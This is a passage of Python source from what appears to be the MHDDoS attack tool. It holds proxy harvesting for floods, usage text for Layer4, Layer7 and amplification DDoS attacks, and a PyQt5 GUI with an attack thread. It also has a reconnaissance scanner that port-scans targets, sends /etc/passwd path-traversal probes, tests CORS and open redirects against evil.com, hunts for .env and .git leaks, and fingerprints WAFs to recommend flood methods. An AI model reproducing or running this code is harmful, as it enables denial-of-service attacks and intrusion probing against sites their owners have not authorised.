        with ThreadPoolExecutor(len(providrs)) as executor:
            future_to_download = {
                executor.submit(
                    ProxyManager.download, provider,
                    ProxyType.stringToProxyType(str(provider["type"])))
                for provider in providrs
            }
            for future in as_completed(future_to_download):
                for pro in future.result():
                    proxes.add(pro)
        return proxes

    @staticmethod
    def download(provider, proxy_type: ProxyType) -> Set[Proxy]:
        logger.debug(
            f"{bcolors.WARNING}Proxies from (URL: {bcolors.OKBLUE}%s{bcolors.WARNING}, Type: {bcolors.OKBLUE}%s{bcolors.WARNING}, Timeout: {bcolors.OKBLUE}%d{bcolors.WARNING}){bcolors.RESET}" %
            (provider["url"], proxy_type.name, provider["timeout"]))
        proxes: Set[Proxy] = set()
        with suppress(TimeoutError, exceptions.ConnectionError,
                      exceptions.ReadTimeout):
            data = get(provider["url"], timeout=provider["timeout"]).text
            try:
                for proxy in ProxyUtiles.parseAllIPPort(
                        data.splitlines(), proxy_type):
                    proxes.add(proxy)
            except Exception as e:
                logger.error(f'Download Proxy Error: {(e.__str__() or e.__repr__())}')
        return proxes


class ToolsConsole:
    METHODS = {"INFO", "TSSRV", "CFIP", "DNS", "PING", "CHECK", "DSTAT"}

    @staticmethod
    def checkRawSocket():
        with suppress(OSError):
            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP):
                return True
        return False

    @staticmethod
    def runConsole():
        cons = f"{gethostname()}@MHTools:~#"

        while 1:
            cmd = input(cons + " ").strip()
            if not cmd: continue
            if " " in cmd:
                cmd, args = cmd.split(" ", 1)

            cmd = cmd.upper()
            if cmd == "HELP":
                print("Tools:" + ", ".join(ToolsConsole.METHODS))
                print("Commands: HELP, CLEAR, BACK, EXIT")
                continue

            if {cmd} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                exit(-1)

            if cmd == "CLEAR":
                print("\033c")
                continue

            if not {cmd} & ToolsConsole.METHODS:
                print(f"{cmd} command not found")
                continue

            if cmd == "DSTAT":
                with suppress(KeyboardInterrupt):
                    ld = net_io_counters(pernic=False)

                    while True:
                        sleep(1)

                        od = ld
                        ld = net_io_counters(pernic=False)

                        t = [(last - now) for now, last in zip(od, ld)]

                        logger.info(
                            ("Bytes Sent %s\n"
                             "Bytes Received %s\n"
                             "Packets Sent %s\n"
                             "Packets Received %s\n"
                             "ErrIn %s\n"
                             "ErrOut %s\n"
                             "DropIn %s\n"
                             "DropOut %s\n"
                             "Cpu Usage %s\n"
                             "Memory %s\n") %
                            (Tools.humanbytes(t[0]), Tools.humanbytes(t[1]),
                             Tools.humanformat(t[2]), Tools.humanformat(t[3]),
                             t[4], t[5], t[6], t[7], str(cpu_percent()) + "%",
                             str(virtual_memory().percent) + "%"))
            if cmd in ["CFIP", "DNS"]:
                print("Soon")
                continue

            if cmd == "CHECK":
                while True:
                    with suppress(Exception):
                        domain = input(f'{cons}give-me-ipaddress# ')
                        if not domain: continue
                        if domain.upper() == "BACK": break
                        if domain.upper() == "CLEAR":
                            print("\033c")
                            continue
                        if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                            exit(-1)
                        if "/" not in domain: continue
                        logger.info("please wait ...")

                        with get(domain, timeout=20) as r:
                            logger.info(('status_code: %d\n'
                                         'status: %s') %
                                        (r.status_code, "ONLINE"
                                        if r.status_code <= 500 else "OFFLINE"))

            if cmd == "INFO":
                while True:
                    domain = input(f'{cons}give-me-ipaddress# ')
                    if not domain: continue
                    if domain.upper() == "BACK": break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                        continue
                    if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                        exit(-1)
                    domain = domain.replace('https://',
                                            '').replace('http://', '')
                    if "/" in domain: domain = domain.split("/")[0]
                    print('please wait ...', end="\r")

                    info = ToolsConsole.info(domain)

                    if not info["success"]:
                        print("Error!")
                        continue

                    logger.info(("Country: %s\n"
                                 "City: %s\n"
                                 "Org: %s\n"
                                 "Isp: %s\n"
                                 "Region: %s\n") %
                                (info["country"], info["city"], info["org"],
                                 info["isp"], info["region"]))

            if cmd == "TSSRV":
                while True:
                    domain = input(f'{cons}give-me-domain# ')
                    if not domain: continue
                    if domain.upper() == "BACK": break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                        continue
                    if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                        exit(-1)
                    domain = domain.replace('https://',
                                            '').replace('http://', '')
                    if "/" in domain: domain = domain.split("/")[0]
                    print('please wait ...', end="\r")

                    info = ToolsConsole.ts_srv(domain)
                    logger.info(f"TCP: {(info['_tsdns._tcp.'])}\n")
                    logger.info(f"UDP: {(info['_ts3._udp.'])}\n")

            if cmd == "PING":
                while True:
                    domain = input(f'{cons}give-me-ipaddress# ')
                    if not domain: continue
                    if domain.upper() == "BACK": break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                        continue
                    if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                        exit(-1)

                    domain = domain.replace('https://',
                                            '').replace('http://', '')
                    if "/" in domain: domain = domain.split("/")[0]

                    logger.info("please wait ...")
                    r = ping(domain, count=5, interval=0.2)
                    logger.info(('Address: %s\n'
                                 'Ping: %d\n'
                                 'Aceepted Packets: %d/%d\n'
                                 'status: %s\n') %
                                (r.address, r.avg_rtt, r.packets_received,
                                 r.packets_sent,
                                 "ONLINE" if r.is_alive else "OFFLINE"))

    @staticmethod
    def stop():
        print('All Attacks has been Stopped !')
        for proc in process_iter():
            if proc.name() == "python.exe":
                proc.kill()

    @staticmethod
    def usage():
        print((
                  '* MHDDoS - DDoS Attack Script With %d Methods\n'
                  'Note: If the Proxy list is empty, The attack will run without proxies\n'
                  '      If the Proxy file doesn\'t exist, the script will download proxies and check them.\n'
                  '      Proxy Type 0 = All in config.json\n'
                  '      SocksTypes:\n'
                  '         - 6 = RANDOM\n'
                  '         - 5 = SOCKS5\n'
                  '         - 4 = SOCKS4\n'
                  '         - 1 = HTTP\n'
                  '         - 0 = ALL\n'
                  ' > Methods:\n'
                  ' - Layer4\n'
                  ' | %s | %d Methods\n'
                  ' - Layer7\n'
                  ' | %s | %d Methods\n'
                  ' - Tools\n'
                  ' | %s | %d Methods\n'
                  ' - Others\n'
                  ' | %s | %d Methods\n'
                  ' - All %d Methods\n'
                  '\n'
                  'Example:\n'
                  '   L7: python3 %s <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration> <debug=optional>\n'
                  '   L4: python3 %s <method> <ip:port> <threads> <duration>\n'
                  '   L4 Proxied: python3 %s <method> <ip:port> <threads> <duration> <socks_type> <proxylist>\n'
                  '   L4 Amplification: python3 %s <method> <ip:port> <threads> <duration> <reflector file (only use with'
                  ' Amplification)>\n') %
              (len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
               ", ".join(Methods.LAYER4_METHODS), len(Methods.LAYER4_METHODS),
               ", ".join(Methods.LAYER7_METHODS), len(Methods.LAYER7_METHODS),
               ", ".join(ToolsConsole.METHODS), len(ToolsConsole.METHODS),
               ", ".join(["TOOLS", "HELP", "STOP"]), 3,
               len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
               argv[0], argv[0], argv[0], argv[0]))

    # noinspection PyBroadException
    @staticmethod
    def ts_srv(domain):
        records = ['_ts3._udp.', '_tsdns._tcp.']
        DnsResolver = resolver.Resolver()
        DnsResolver.timeout = 1
        DnsResolver.lifetime = 1
        Info = {}
        for rec in records:
            try:
                srv_records = resolver.resolve(rec + domain, 'SRV')
                for srv in srv_records:
                    Info[rec] = str(srv.target).rstrip('.') + ':' + str(
                        srv.port)
            except:
                Info[rec] = 'Not found'

        return Info

    # noinspection PyUnreachableCode
    @staticmethod
    def info(domain):
        with suppress(Exception), get(f"https://ipwhois.app/json/{domain}/") as s:
            return s.json()
        return {"success": False}


def handleProxyList(con, proxy_li, proxy_ty, url=None, threads=100):
    if proxy_ty not in {4, 5, 1, 0, 6}:
        exit("Socks Type Not Found [4, 5, 1, 0, 6]")
    if proxy_ty == 6:
        proxy_ty = randchoice([4, 5, 1])
    if not proxy_li.exists():
        proxy_li.parent.mkdir(parents=True, exist_ok=True)
        with proxy_li.open("w") as wr:
            Proxies = ProxyManager.DownloadFromConfig(con, proxy_ty)
            if Proxies:
                Proxies = ProxyChecker.checkAll(
                    Proxies, timeout=5, threads=threads,
                    url=url.human_repr() if url else "http://httpbin.org/get",
                )
            if not Proxies:
                wr.write("")
                return None
            wr.write("\n".join(p.__str__() for p in Proxies))
            logger.info(
                f"Saved {len(Proxies)} proxies to {proxy_li}")

    proxies = ProxyUtiles.readFromFile(proxy_li)
    if proxies:
        logger.info(f"{bcolors.WARNING}Proxy Count: {bcolors.OKBLUE}{len(proxies):,}{bcolors.RESET}")
    else:
        logger.info(
            f"{bcolors.WARNING}Empty Proxy File, running flood without proxy{bcolors.RESET}")
        proxies = None

    return proxies

import sys
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit,
                             QComboBox, QPushButton, QTextEdit, QGroupBox, QTabWidget, QSpinBox, QFileDialog,
                             QMessageBox, QScrollArea, QCheckBox, QProgressBar)
from PyQt5.QtCore import QThread, pyqtSignal, Qt, QTimer, QMetaType
from PyQt5.QtGui import QTextCursor
import ctypes

# Note: Removed qRegisterMetaType(QTextCursor) — that call's signature is unstable
# across PyQt5 versions and was triggering segfaults at GUI startup. The
# "QObject::connect: Cannot queue arguments of type 'QTextCursor'" warning is
# harmless (cosmetic only) — fundamental fix is to never call log_message from
# non-Qt threads, which is enforced by signals in the AttackThread/ScanThread.


class LogSignal(QThread):
    """Tiny signal-only thread to bridge background threads → GUI log safely.
       Using QTimer.singleShot from non-QThread is unsafe (causes the
       'QObject::startTimer: Timers can only be used with QThread' warning)."""
    log = pyqtSignal(str)
    def run(self):
        pass


class AttackThread(QThread):
    update_signal = pyqtSignal(str)
    finished_signal = pyqtSignal()
    stopped = False

    
    def __init__(self, attack_function, *args, **kwargs):
        super().__init__()
        self.attack_function = attack_function
        self.args = args
        self.kwargs = kwargs
        self.running = True
        self.stop_event = threading.Event()
        
    def run(self):
        try:
            self.kwargs['stop_event'] = self.stop_event
            self.attack_function(*self.args, **self.kwargs)
        except Exception as e:
            self.update_signal.emit(f"Error: {str(e)}")
        finally:
            self.finished_signal.emit()
            self.stopped = True
    
    def stop(self):
        self.running = False
        self.stop_event.set()
        self.update_signal.emit("Send stop signal...")


class ScanThread(QThread):
    """Background thread for website scanning — keeps GUI responsive."""
    update_signal = pyqtSignal(str)
    finished_signal = pyqtSignal(dict)  # emits detected_categories dict
    error_signal = pyqtSignal(str)

    def __init__(self, url):
        super().__init__()
        self.url = url
        self._cancelled = False

    def run(self):
        try:
            import requests, re, ssl, socket as sock, json
            from urllib.parse import urlparse
            from concurrent.futures import ThreadPoolExecutor, as_completed
            import time as time_mod

            url = self.url
            parsed = urlparse(url)
            hostname = parsed.hostname
            scheme = parsed.scheme
            base_port = parsed.port or (443 if scheme == "https" else 80)

            headers_modern = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Cache-Control": "max-age=0",
                "Sec-Ch-Ua": '"Chromium";v="131", "Not_A Brand";v="24"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"macOS"',
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Upgrade-Insecure-Requests": "1",
            }

            self.update_signal.emit(f"═══ ADVANCED SCAN v2: {url} ═══")

            # ========== PHASE 0: IP & Geo ==========
            self.update_signal.emit("[PHASE 0] IP & Geolocation lookup...")
            try:
                target_ip = sock.gethostbyname(hostname)
            except:
                target_ip = "?"
            geo = {}
            try:
                geo_r = requests.get(f"http://ip-api.com/json/{target_ip}", timeout=3)
                geo = geo_r.json() if geo_r.ok else {}
            except:
                pass
            self.update_signal.emit(f"  IP: {target_ip} | Geo: {geo.get('country','?')}/{geo.get('city','?')} | ISP: {geo.get('isp','?')}")

            if self._cancelled: return

            # ========== PHASE 1: DNS Enumeration ==========
            self.update_signal.emit("[PHASE 1] DNS Records...")
            dns_types = {"A":[],"AAAA":[],"MX":[],"TXT":[],"NS":[],"CNAME":[],"SOA":[]}
            try:
                from dns import resolver
                dr = resolver.Resolver()
                dr.timeout = 2
                dr.lifetime = 2
                for rtype in dns_types:
                    try:
                        answers = dr.resolve(hostname, rtype)
                        dns_types[rtype] = [str(a) for a in answers][:6]
                    except:
                        pass
            except:
                pass
            for rtype, vals in dns_types.items():
                if vals:
                    self.update_signal.emit(f"  {rtype}: {', '.join(vals[:3])}")

            if self._cancelled: return

            # ========== PHASE 2: Port Scan ==========
            self.update_signal.emit("[PHASE 2] Port scan (top 20)...")
            TOP_PORTS = [21,22,25,53,80,110,143,443,465,587,993,995,3306,5432,6379,8080,8443,9090,27017,9200]
            open_ports = []

            def _port_scan(p):
                try:
                    s = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
                    s.settimeout(0.3)
                    s.connect((target_ip if target_ip != "?" else hostname, p))
                    s.close()
                    return p
                except:
                    return None

            with ThreadPoolExecutor(max_workers=20) as ex:
                futures = {ex.submit(_port_scan, p): p for p in TOP_PORTS}
                for f in as_completed(futures):
                    res = f.result()
                    if res:
                        open_ports.append(res)
            if open_ports:
                self.update_signal.emit(f"  Open: {', '.join(str(p) for p in sorted(open_ports))}")
            else:
                self.update_signal.emit(f"  No open ports detected (common ports)")

            if self._cancelled: return

            # ========== PHASE 3: HTTP Timing Profile ==========
            self.update_signal.emit("[PHASE 3] HTTP Timing + response...")
            timing = {"dns_ms":0,"tcp_ms":0,"ssl_ms":0,"ttfb_ms":0,"download_ms":0}
            try:
                import time as time_mod
                t0 = time_mod.perf_counter()
                ip = sock.gethostbyname(hostname)
                timing["dns_ms"] = int((time_mod.perf_counter()-t0)*1000)

                t0 = time_mod.perf_counter()
                raw = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
                raw.settimeout(5)
                raw.connect((ip, base_port))
                timing["tcp_ms"] = int((time_mod.perf_counter()-t0)*1000)

                if scheme == "https":
                    t0 = time_mod.perf_counter()
                    ctx_t = ssl.create_default_context()
                    ssock_time = ctx_t.wrap_socket(raw, server_hostname=hostname)
                    timing["ssl_ms"] = int((time_mod.perf_counter()-t0)*1000)
                    timing["ssl_version"] = ssock_time.version()
                    timing["ssl_cipher"] = ssock_time.cipher()[0] if ssock_time.cipher() else "?"
                    try:
                        timing["ssl_alpn"] = ssock_time.selected_alpn_protocol()
                    except:
                        timing["ssl_alpn"] = "?"
                    ssock_time.close()
                else:
                    raw.close()
            except Exception as e:
                self.update_signal.emit(f"  Timing error: {e}")

            t0_req = time_mod.perf_counter()
            r = requests.get(url, headers=headers_modern, timeout=15, allow_redirects=True, verify=True)
            timing["ttfb_ms"] = int((time_mod.perf_counter()-t0_req)*1000)
            body = r.text
            body_lower = body[:8000].lower()
            status = r.status_code
            rh = {k.lower(): v for k, v in r.headers.items()}
            timing["download_ms"] = int(r.elapsed.total_seconds()*1000) - timing["ttfb_ms"]

            self.update_signal.emit(f"  Status: {status} | DNS:{timing['dns_ms']}ms TCP:{timing['tcp_ms']}ms "
                                     f"SSL:{timing.get('ssl_ms',0)}ms TTFB:{timing['ttfb_ms']}ms DL:{timing['download_ms']}ms")
            if timing.get("ssl_alpn"):
                self.update_signal.emit(f"  ALPN: {timing['ssl_alpn']} ({'HTTP/2' if 'h2' in timing['ssl_alpn'] else 'HTTP/1.1'})")

            if self._cancelled: return

            # ========== PHASE 4: HTTP Methods ==========
            self.update_signal.emit("[PHASE 4] HTTP method detection...")
            http_methods = {}
            for meth in ["OPTIONS", "TRACE", "PUT", "DELETE", "PATCH"]:
                try:
                    mr = requests.request(meth, url, headers=headers_modern, timeout=5, allow_redirects=False)
                    http_methods[meth] = mr.status_code
                except:
                    http_methods[meth] = "ERROR"
            if http_methods.get("OPTIONS","") and http_methods["OPTIONS"] != "ERROR":
                allow = requests.request("OPTIONS", url, headers=headers_modern, timeout=5).headers.get("Allow","")
                if allow:
                    self.update_signal.emit(f"  ALLOWED METHODS: {allow}")
            if http_methods.get("TRACE") == 200:
                self.update_signal.emit(f"  ⚠ TRACE enabled (XST vulnerability possible)")
            self.update_signal.emit(f"  Methods: {', '.join(f'{m}={s}' for m,s in http_methods.items())}")

            if self._cancelled: return

            # ========== PHASE 5: CORS + Open Redirect ==========
            self.update_signal.emit("[PHASE 5] CORS & redirect tests...")
            cors_result = "none"
            try:
                cors_h = {**headers_modern, "Origin": "https://evil.com"}
                cors_r = requests.get(url, headers=cors_h, timeout=8)
                acao = cors_r.headers.get("Access-Control-Allow-Origin","")
                acac = cors_r.headers.get("Access-Control-Allow-Credentials","")
                if acao == "https://evil.com" and acac == "true":
                    cors_result = "⚠ WILDCARD WITH CREDENTIALS — exploitable!"
                elif "https://evil.com" in acao:
                    cors_result = "Reflects origin"
                elif acao == "*":
                    cors_result = "Wildcard (no credentials)"
                else:
                    cors_result = f"Restricted: {acao}"
            except:
                cors_result = "Error"
            self.update_signal.emit(f"  CORS: {cors_result}")

            redir_found = False
            for redir_path in [f"{url}?redirect=https://evil.com", f"{url}?url=https://evil.com",
                               f"{url}?next=https://evil.com", f"{url}?goto=https://evil.com"]:
                try:
                    rr = requests.get(redir_path, headers=headers_modern, timeout=5, allow_redirects=False)
                    loc = rr.headers.get("Location","")
                    if "evil.com" in loc:
                        redir_found = True
                        self.update_signal.emit(f"  ⚠ Open redirect: {redir_path.split('?')[1]}")
                        break
                except:
                    pass
            if not redir_found:
                self.update_signal.emit(f"  Open redirect: not found")

            if self._cancelled: return

            # ========== PHASE 6: Endpoint Discovery ==========
            self.update_signal.emit("[PHASE 6] Endpoint discovery...")
            endpoints = {
                "/graphql": "GraphQL", "/graphiql": "GraphQL IDE", "/api/graphql": "GraphQL API",
                "/.well-known/security.txt": "Security.txt", "/robots.txt": "Robots",
                "/sitemap.xml": "Sitemap", "/.env": "⚠ ENV FILE LEAK", "/wp-json/": "WordPress API",
                "/admin": "Admin panel", "/login": "Login page", "/.git/config": "⚠ GIT LEAK",
                "/phpinfo.php": "⚠ PHPINFO", "/status": "Status page",
            }
            for ep, label in endpoints.items():
                try:
                    er = requests.get(url.rstrip("/") + ep, headers=headers_modern, timeout=5, allow_redirects=True)
                    if er.status_code in (200, 301, 302, 401, 403):
                        self.update_signal.emit(f"  {label}: {url.rstrip('/')}{ep} → {er.status_code}")
                except:
                    pass

            # GraphQL introspection probe
            try:
                gql_body = json.dumps({"query":"{__schema{types{name}}}"})
                gql_h = {**headers_modern, "Content-Type": "application/json"}
                gql_r = requests.post(url.rstrip("/") + "/graphql", headers=gql_h, data=gql_body, timeout=5)
                if "__schema" in gql_r.text or "__typename" in gql_r.text:
                    self.update_signal.emit(f"  ⚠ GraphQL introspection ENABLED")
            except:
                pass

            if self._cancelled: return

            # ========== PHASE 7: Path Traversal ==========
            self.update_signal.emit("[PHASE 7] Path traversal probes...")
            for tr_path in ["/..;/..;/..;/etc/passwd", "/....//....//....//etc/passwd",
                           "/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "/..%252f..%252f..%252fetc/passwd",
                           "/../../../../etc/passwd"]:
                try:
                    tr = requests.get(url.rstrip("/") + tr_path, headers=headers_modern, timeout=5)
                    if "root:" in tr.text[:500]:
                        self.update_signal.emit(f"  ⚠ PATH TRAVERSAL: {tr_path}")
                        break
                except:
                    pass
            self.update_signal.emit(f"  Path traversal: tested 5 patterns, no root: leak")

            # ========== PHASE 8: crt.sh ==========
            self.update_signal.emit("[PHASE 8] Subdomain enumeration (crt.sh)...")
            subdomains = set()
            try:
                crt_r = requests.get(f"https://crt.sh/?q=%25.{hostname}&output=json", timeout=10)
                for entry in crt_r.json()[:200]:
                    name = entry.get("name_value","")
                    for n in name.split("\n"):
                        n = n.strip().replace("*.","")
                        if hostname in n and n != hostname:
                            subdomains.add(n)
                subs = sorted(subdomains)[:20]
                if subs:
                    self.update_signal.emit(f"  Found {len(subdomains)} subdomains: {', '.join(subs[:10])}")
                    if len(subdomains) > 10:
                        self.update_signal.emit(f"  ... and {len(subdomains)-10} more")
                else:
                    self.update_signal.emit(f"  No subdomains found via crt.sh")
            except:
                self.update_signal.emit(f"  crt.sh query failed (rate-limited or no certs)")

            if self._cancelled: return

            # ========== PHASE 9: WAF Fingerprinting ==========
            self.update_signal.emit("[PHASE 9] WAF/server fingerprint...")
            body404 = ""
            try:
                r404 = requests.get(url.rstrip("/") + "/__MHDDOS_SCAN_404__" + str(int(time_mod.perf_counter())), headers=headers_modern, timeout=8)
                body404 = r404.text[:3000].lower()
            except:
                pass

            # --- TLS Cert ---
            tls_info = {}
            if scheme == "https":
                try:
                    ctx_ssl = ssl.create_default_context()
                    with sock.create_connection((hostname, base_port), timeout=5) as sock_raw:
                        with ctx_ssl.wrap_socket(sock_raw, server_hostname=hostname) as ssock:
                            cert = ssock.getpeercert()
                            tls_info["issuer"] = dict(x[0] for x in cert.get("issuer", [])) if cert else {}
                            tls_info["sans"] = [x[1] for x in cert.get("subjectAltName", [])] if cert else []
                            tls_info["not_after"] = cert.get("notAfter", "") if cert else ""
                            tls_info["version"] = timing.get("ssl_version","?")
                            tls_info["cipher"] = timing.get("ssl_cipher","?")
                except:
                    pass

            # --- Fingerprint ---
            findings = {"waf_cdn": [], "server": [], "framework": [], "cms": [],
                       "language": [], "security_headers": [], "tls": [], "vulnerabilities": []}

            WAF_SIGS = {
                "Cloudflare": [("cf-ray", rh), ("cf-cache-status", rh), ("cloudflare", r.text[:500].lower())],
                "Sucuri": [("x-sucuri-id", rh)],
                "Akamai": [("x-akamai-transformed", rh), ("x-akamai-request-id", rh)],
                "Imperva / Incapsula": [("x-iinfo", rh), ("x-cdn", rh)],
                "DDoS-Guard": [("ddg-id", rh), ("x-ddg-project", rh)],
                "AWS CloudFront / Shield": [("x-amz-cf-id", rh), ("x-amzn-requestid", rh)],
                "Fastly": [("x-fastly-request-id", rh)],
                "Vercel": [("x-vercel-id", rh)],
                "F5 BIG-IP": [("x-wa-info", rh)],
                "Wordfence": [("wordfence_verifiedHuman", rh.get("set-cookie",""))],
            }
            for waf_name, sigs in WAF_SIGS.items():
                for key, source in sigs:
                    try:
                        if key.lower() in str(source).lower():
                            findings["waf_cdn"].append(waf_name)
                            break
                    except:
                        pass

            server_hdr = rh.get("server", "")
            if server_hdr:
                findings["server"].append(f"Server header: {server_hdr}")
            SERVER_SIGS = {"Apache": ["apache"], "Nginx": ["nginx"], "LiteSpeed": ["litespeed"],
                          "IIS / Microsoft": ["microsoft-iis", "iis/"], "Caddy": ["caddy"],
                          "Tomcat": ["tomcat"], "Node.js": ["node.js", "express"],
                          "Gunicorn": ["gunicorn"], "HAProxy": ["haproxy"], "Varnish": ["varnish"]}
            for srv_name, sigs in SERVER_SIGS.items():
                for sig in sigs:
                    if sig in server_hdr.lower() or sig in str(rh).lower():
                        findings["server"].append(srv_name)
                        break

            FRAMEWORK_SIGS = {"React": ["react."], "Vue.js": ["vue.js"], "Angular": ["angular"],
                             "jQuery": ["jquery"], "Bootstrap": ["bootstrap"],
                             "Next.js": ["__next", "/_next/static"], "Laravel": ["laravel"],
                             "Django": ["django"], "ASP.NET": ["__viewstate", "asp.net"],
                             "Spring": ["spring"], "Flask": ["flask"],
                             "Express.js": ["x-powered-by: express"], "Svelte": ["svelte"],
                             "Gatsby": ["gatsby"], "Astro": ["astro"]}
            for fw_name, sigs in FRAMEWORK_SIGS.items():
                for sig in sigs:
                    if sig in body_lower or sig in str(rh).lower():
                        findings["framework"].append(fw_name)
                        break

            CMS_SIGS = {"WordPress": ["wp-content", "wordpress", "xmlrpc.php", "wp-json"],
                       "Joomla": ["joomla"], "Drupal": ["drupal"],
                       "Magento": ["magento"], "Shopify": ["shopify", "myshopify"],
                       "WooCommerce": ["woocommerce"], "Wix": ["wix.com"],
                       "Squarespace": ["squarespace"], "Ghost": ["ghost"], "PrestaShop": ["prestashop"]}
            for cms_name, sigs in CMS_SIGS.items():
                for sig in sigs:
                    if sig in body_lower or sig in str(rh).lower():
                        findings["cms"].append(cms_name)
                        break

            powered = rh.get("x-powered-by", "")
            if powered:
                findings["language"].append(f"X-Powered-By: {powered}")
            LANG_SIGS = {"PHP": [".php", "phpsessid"], "Python": ["python", "django", "flask"],
                         "Node.js": ["node", "express"], "Ruby": [".rb", "ruby"],
                         "Java": [".jsp", "jsessionid"], "Go": ["go ", "golang"],
                         "C# / .NET": [".aspx", "asp.net"]}
            for lang_name, sigs in LANG_SIGS.items():
                for sig in sigs:
                    if sig in body_lower or sig in str(rh).lower():
                        findings["language"].append(lang_name)
                        break

            SEC_HEADERS = {"Strict-Transport-Security": "strict-transport-security",
                          "Content-Security-Policy": "content-security-policy",
                          "X-Frame-Options": "x-frame-options",
                          "X-Content-Type-Options": "x-content-type-options",
                          "Referrer-Policy": "referrer-policy",
                          "Permissions-Policy": "permissions-policy",
                          "X-XSS-Protection": "x-xss-protection"}
            for hdr_name, hdr_key in SEC_HEADERS.items():
                if hdr_key in rh:
                    findings["security_headers"].append(f"{hdr_name} ✓ ({rh[hdr_key][:60]})")

            if tls_info:
                findings["tls"].append(f"TLS: {tls_info.get('version','?')} / {tls_info.get('cipher','?')}")
                findings["tls"].append(f"Cert Expiry: {tls_info.get('not_after','?')}")
            if status == 200 and (r.elapsed.total_seconds() > 5):
                findings["vulnerabilities"].append(f"⚠ Slow response ({r.elapsed.total_seconds():.1f}s)")

            # --- Attack Category Mapping ---
            detected = set()
            if "Cloudflare" in str(findings["waf_cdn"]):
                detected.add("Cloudflare Protected")
            if "DDoS-Guard" in str(findings["waf_cdn"]):
                detected.add("DDoS-Guard")
            if "WordPress" in findings["cms"] or findings["cms"]:
                detected.add("WordPress / CMS")
            if "Apache" in findings["server"]:
                detected.add("Apache Server")
            if ".onion" in url:
                detected.add("Tor / Onion")
            if not detected:
                detected.add("General HTTP Flood")
            detected.add("Heavy / Bandwidth")
            detected.add("2026 Upgrades")

            # --- Output Report ---
            self.update_signal.emit(f"═══ SCAN RESULTS for {url} ═══")
            self.update_signal.emit(f"  Status: {status} | Response: {r.elapsed.total_seconds():.2f}s | Size: {Tools.humanbytes(len(body))}")

            for section, items in [("🛡 WAF / CDN", findings["waf_cdn"]), ("🖥 Server", findings["server"]),
                                  ("⚙ Framework", findings["framework"]), ("📦 CMS", findings["cms"]),
                                  ("🔧 Stack", findings["language"]), ("🔐 Security Headers", findings["security_headers"]),
                                  ("🔒 TLS", findings["tls"]), ("⚠ Vulnerabilities", findings["vulnerabilities"])]:
                if items:
                    self.update_signal.emit(f"  {section}:")
                    for it in items:
                        self.update_signal.emit(f"    - {it}")

            self.update_signal.emit(f"  → Recommended Categories: {', '.join(sorted(detected))}")

            # Protection Score
            score = min(len(findings["waf_cdn"]) * 15, 40) + min(len(findings["security_headers"]) * 5, 25)
            score += 20 if "Cloudflare" in str(findings["waf_cdn"]) else 0
            score += 10 if "TLSv1.3" in str(tls_info.get("version","")) else 0
            score -= 10 if findings["vulnerabilities"] else 0
            score = max(0, min(100, score))
            bar = "█" * (score // 10) + "░" * (10 - score // 10)
            self.update_signal.emit(f"  Protection Score: [{bar}] {score}/100")

            # Emit detected categories for checkbox auto-select
            self.finished_signal.emit({"detected": detected, "findings": findings, "score": score, "status": status})

        except Exception as e:
            self.error_signal.emit(f"Scan failed: {str(e)}")
            import traceback
            self.update_signal.emit(traceback.format_exc()[-300:])

    def cancel(self):
        self._cancelled = True


# === Global dark theme stylesheet ===
DARK_THEME = """
QMainWindow, QWidget { background-color: #1e1e1e; color: #e0e0e0; }
QGroupBox {
    background-color: #252526;
    border: 1px solid #3e3e42;
    border-radius: 6px;
    margin-top: 12px;
    padding-top: 10px;
    font-weight: bold;
    color: #66aaff;
}
QGroupBox::title {
    subcontrol-origin: margin;
    left: 12px;
    padding: 0 6px;
    background-color: #1e1e1e;
}
QTabWidget::pane { border: 1px solid #3e3e42; background: #1e1e1e; border-radius: 4px; }
QTabBar::tab {
    background: #2d2d30;
    color: #cccccc;
    padding: 6px 14px;
    margin-right: 2px;
    border-top-left-radius: 4px;
    border-top-right-radius: 4px;
    font-weight: bold;
    min-width: 110px;
}
QTabBar::tab:selected { background: #007acc; color: white; }
QTabBar::tab:hover:!selected { background: #3e3e42; }
QPushButton {
    background-color: #0e639c;
    color: white;
    border: none;
    padding: 5px 12px;
    border-radius: 4px;
    font-weight: bold;
    min-height: 22px;
}
QPushButton:hover { background-color: #1177bb; }
QPushButton:pressed { background-color: #094771; }
QPushButton:disabled { background-color: #3e3e42; color: #777; }
QLineEdit, QSpinBox, QComboBox {
    background-color: #2d2d30;
    color: #e0e0e0;
    border: 1px solid #3e3e42;
    padding: 5px 8px;
    border-radius: 4px;
    selection-background-color: #007acc;
}
QLineEdit:focus, QSpinBox:focus, QComboBox:focus { border: 1px solid #007acc; }
QComboBox::drop-down { border: none; width: 20px; }
QComboBox QAbstractItemView { background: #2d2d30; color: #e0e0e0; selection-background-color: #007acc; }
QCheckBox { color: #e0e0e0; spacing: 6px; }
QCheckBox::indicator {
    width: 14px;
    height: 14px;
    border: 1px solid #5e5e62;
    border-radius: 3px;
    background: #2d2d30;
}
